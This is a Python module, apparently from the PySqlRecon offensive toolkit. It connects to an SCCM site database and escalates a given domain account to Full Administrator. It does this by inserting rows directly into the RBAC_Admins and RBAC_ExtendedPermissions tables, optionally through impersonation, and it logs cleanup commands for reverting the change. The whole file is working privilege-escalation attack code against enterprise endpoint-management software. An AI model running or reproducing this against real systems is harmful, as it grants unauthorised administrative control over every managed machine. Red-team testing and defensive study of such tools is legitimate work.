import typer

from pysqlrecon.logger import logger
from pysqlrecon.lib import PySqlRecon

app = typer.Typer()
COMMAND_NAME = "addadmin"
HELP = "[red][PRIV][/] Elevate an account to Full Administrator [I]"
LINK_COMPATIBLE = False
IMPERSONATE_COMPATIBLE = True


@app.callback(invoke_without_command=True)
def main(
    ctx:    typer.Context,
    user:   str = typer.Option(..., "--user", help="DOMAIN\\User to elevate"),
    sid:    str = typer.Option(..., "--sid", help="SID of the user to elevate")):
    
    pysqlrecon: PySqlRecon = ctx.obj['pysqlrecon']
    use_basic_tables = ctx.obj['basic_tables']

    # verify opts are compatible with module before connecting
    if not PySqlRecon.validate_opts(
        LINK_COMPATIBLE,
        IMPERSONATE_COMPATIBLE,
        pysqlrecon.link,
        pysqlrecon.impersonate
    ):
        exit()

    if pysqlrecon.db == 'master':
        logger.warning("You likely need to specify the CM_[SITE] database")

    #
    # Validate username format
    #
    if "\\" not in user:
        logger.error("Please specify user in DOMAIN\\User format")
        exit()
    
    username = user.split("\\")[1]
    sms00all = False
    sms0004 = False
    sms0001 = False


    pysqlrecon.connect()

    logger.info(f"Elevating {user} to Full Administrator role")

    #
    # Get site code
    #
    query = "select ThisSiteCode from [dbo].[v_Identification]"
    
    logger.debug("Querying site code...")
    
    pysqlrecon.query_handler(query)
    site_code = pysqlrecon.get_last_resp(attr="ThisSiteCode")
    
    logger.debug(f"Site code: {site_code}")

    #
    # Check RBAC_Admins for existing entry 
    #
    logger.debug("Checking for existing entry in RBAC_Admins...")

    hex_sid = PySqlRecon.convert_sid_to_binary(sid).hex()
    query = f"Select AdminID, AdminSID, LogonName from [dbo].[RBAC_Admins] where AdminSID = 0x{hex_sid}"
    
    pysqlrecon.query_handler(query)

    res_count = len(pysqlrecon.ms_sql.rows)

    #
    # Too many entries found
    #
    if res_count > 1:
        logger.warning(f"{res_count} entries found for {user} in RBAC_Admins")
        logger.warning("Choose new user or delete an entry")
        pysqlrecon.disconnect()
        exit()
    #
    # One entry found, calc permissions to add
    #
    elif res_count == 1:
        logger.debug(f"Found 1 entry for {user} in RBAC_Admins")
        
        id = pysqlrecon.get_last_resp(attr="AdminID")
        logger.debug(f"Existing AdminID: {id}")
        
        query = f"select ScopeID,RoleID from [dbo].[RBAC_ExtendedPermissions] where AdminID = {id}"
        pysqlrecon.query_handler(query)
        
        for row in pysqlrecon.ms_sql.rows:
            if row['ScopeID'] == "SMS00ALL" and row['RoleID'] == "SMS0001R":
                sms00all = True
            if row['ScopeID'] == "SMS00004" and row['RoleID'] == "SMS0001R":
                sms0004 = True
            if row['ScopeID'] == "SMS00001" and row['RoleID'] == "SMS0001R":
                sms0001 = True

        if sms00all and sms0004 and sms0001:
            logger.warning(f"{user} already has Full Administrator permissions")
            pysqlrecon.disconnect()
            exit()

        existing_privs = ""
        if sms00all : existing_privs += "SMS00ALL|SMS0001R,"
        if sms0004  : existing_privs += "SMS00004|SMS0001R,"
        if sms0001  : existing_privs += "SMS00001|SMS0001R,"

        if existing_privs != "":
            logger.info(f"Restore original permissions with pysqlrecon [OPTIONS] sccm removeadmin --adminid {id} --permissions '{existing_privs[:-1]}'")

    #
    # No entries found, add new entry
    #
    elif res_count == 0:
        logger.debug(f"No entries found for {user} in RBAC_Admins")
        logger.info("Adding new entry...")

        query = "INSERT INTO RBAC_Admins(AdminSID,LogonName,DisplayName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) " \
                f"VALUES (0x{hex_sid},'{user}','{username}',0,0,'','','','','{site_code}')"

        pysqlrecon.query_handler(query)

        #
        # Ensure user was added and get AdminID for removal command
        #
        logger.info("Checking if user was added...")
        query = f"Select AdminID from [dbo].[RBAC_Admins] where AdminSID = 0x{hex_sid}"
        pysqlrecon.query_handler(query)

        if len(pysqlrecon.ms_sql.rows) == 0:
            logger.error("Failed to add user")
            pysqlrecon.disconnect()
            exit()

        id = pysqlrecon.get_last_resp(attr="AdminID")
        logger.info(f"User added with ID: {id}")
        logger.info(f"Remove with pysqlrecon [OPTIONS] sccm removeadmin --adminid {id} --permissions '00000000|00000000'")

    #
    # Add permissions
    #
    logger.info("Adding permissions...")
    permissions = ''
    if not sms00all : permissions += f"({id}, 'SMS0001R', 'SMS00ALL', '29'),"
    if not sms0004  : permissions += f"({id}, 'SMS0001R', 'SMS00004', '1'),"
    if not sms0001  : permissions += f"({id}, 'SMS0001R', 'SMS00001', '1'),"
    
    permissions = permissions[:-1]
    
    query = "INSERT INTO [dbo].[RBAC_ExtendedPermissions] (AdminID,RoleID,ScopeID,ScopeTypeID) Values " + permissions
    logger.debug(f"Constructed add privs statement: {query}")

    pysqlrecon.query_handler(query)

    logger.info(f"User {user} should be elevated to Full Administrator in SCCM")

    pysqlrecon.disconnect()
    
